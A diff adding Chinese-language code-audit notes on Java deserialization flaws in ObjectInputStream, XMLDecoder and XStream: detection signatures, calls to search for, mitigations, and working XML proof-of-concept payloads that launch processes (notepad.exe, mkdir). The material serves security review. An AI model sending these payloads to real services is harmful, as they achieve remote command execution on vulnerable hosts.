@@ -350,6 +350,77 @@ if(token != null && token.equals(req_token)) {
 
 ## 反序列化
 
+### Java
+
+#### ObjectInputStream
+
+1. 请求报文以16进制`aced 0005`开头，即序列化后的对象在http请求中发送。BASE64为r00AB。
+1. 代码中搜索：`ObjectInputStream.readObject()`
+1. poc: [ysoserial](https://github.com/frohoff/ysoserial)
+    - `ObjectInputStream.readObject()`会自动调用实现了Serializable/Externalizable接口的类方法：
+        - `readObject()`
+        - `readObjectNoData()`
+        - `readResolve()`
+        - `readExternal()`
+
+        **将POC写入到这些方法中**，如：`Runtime.getRuntime().exec("open /Applications/Calculator.app/");`。
+
+1. 消减措施: 继承ObjectInputStream并重写resolveClass
+    1. 增加白名单校验: `"com.xxx.Xxx".equals(desc.getName())`
+    1. 增加安全管理器:
+        - `permission java.io.SerializablePermission "enableSubclassImplementation";`
+        - `permission java.io.SerializablePermission "com.xxx.Xxx";`
+        - `sm.checkPermission(new SerializablePermission("com.xxx."+desc.getName()));`
+
+#### XMLDecoder
+
+1. 请求为xml格式, 且包含`class="java.beans.XMLDecoder"`
+1. 代码中搜索：`java.beans.XMLDecoder.readObject()`
+1. poc:
+
+    ```xml
+    <?xml version="1.0" encoding="UTF-8"?>
+    <java version="1.8.0_241" class="java.beans.XMLDecoder">
+     <object class="java.lang.ProcessBuilder">
+      <array class="java.lang.String" length="1">
+       <void index="0">
+        <string>notepad.exe</string>
+       </void>
+      </array>
+      <void method="start" />
+     </object>
+    </java>
+    ```
+
+#### XStream <= 1.4.10
+
+[XStream](https://x-stream.github.io/), April 12, 2020 XStream 1.4.12 released
+
+1. 请求为xml格式, 且xml内容为Java Bean格式
+1. 代码中搜索：`xStream.fromXML()`
+1. poc:
+
+    ```xml
+    <sorted-set>
+        <string>foo</string>
+        <dynamic-proxy>
+            <interface>java.lang.Comparable</interface>
+            <handler class="java.beans.EventHandler">
+                <target class="java.lang.ProcessBuilder">
+                    <command>
+                        <string>/usr/bin/mkdir</string>
+                        <string>/tmp/hackerdir</string>
+                    </command>
+                </target>
+                <action>start</action>
+            </handler>
+        </dynamic-proxy>
+    </sorted-set>
+    ```
+
+
+### PHP
+
 ```php
 // 定义类
 class Cl{
